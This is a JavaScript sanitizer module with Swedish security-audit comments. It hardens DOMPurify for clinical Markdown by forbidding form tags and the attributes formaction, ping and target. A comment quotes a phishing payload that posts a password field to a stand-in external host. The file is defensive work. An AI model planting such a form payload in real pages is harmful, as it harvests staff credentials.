// Säkerhetsgranskning 2026-08-17 (Del 4 – fynd 4.2). Saneringen av rutinernas Markdown bodde
// tidigare som ett uttryck inne i MarkdownInnehall.jsx:
//
//   DOMPurify.sanitize(marked.parse(text ?? ""))
//
// Ordningen och verktygen var rätt, men anropet saknade konfiguration – och DOMPurifys
// STANDARDkonfiguration tillåter `<form>`, `<input>`, `<button>`, `<select>` och
// `<textarea>`. Verifierat i riktig Chromium (se tests/e2e/markdownsanering.spec.js):
// nyttolasten `<form action="https://annan.example"><input name="losenord"></form>`
// passerade oförändrad.
//
// Angriparen är en redaktör i den egna organisationen. Konsekvensen är nätfiske PÅ den sida
// personalen är upplärd att lita på: ett inloggningsliknande fält mitt i en klinisk rutin,
// som POST:ar till en extern server. CSP:ns `form-action 'self'` skulle stoppa själva
// submitten – men policyn är i Report-Only-läge och blockerar därför ingenting i dag
// (se fynd 4.1). Två lager som båda var avstängda.
//
// Bor i src/utils och inte i komponenten för att den ska gå att köra i ett e2e-test utan att
// rendera React – och för att saneringsregeln är ett säkerhetsbeslut, inte en presentations-
// detalj. Samma resonemang som storageUrl.js (Del 3) och roles.js (Etapp 67a).
import { marked } from "marked";
import DOMPurify from "dompurify";

// Element som aldrig har ett legitimt syfte i en klinisk rutintext, men som DOMPurify
// släpper igenom som standard. Listan är medvetet en NEKANDE-lista ovanpå DOMPurifys egen
// tillåtlista, inte en ersättning för den: byter någon ut biblioteket ska den fortfarande
// utgå från DOMPurifys härdade standard, inte från vår kortare uppräkning.
export const FORBJUDNA_TAGGAR = ["form", "input", "button", "select", "textarea", "option", "label"];

// Attribut som styr VART något skickas eller laddas in. `formaction` kan kapa en submit även
// utan en <form>-tagg, och `ping` skickar ett tyst spårningsanrop vid klick på en länk.
export const FORBJUDNA_ATTRIBUT = ["formaction", "ping", "target"];

export function saneraMarkdown(text) {
  return DOMPurify.sanitize(marked.parse(text ?? ""), {
    FORBID_TAGS: FORBJUDNA_TAGGAR,
    FORBID_ATTR: FORBJUDNA_ATTRIBUT,
  });
}
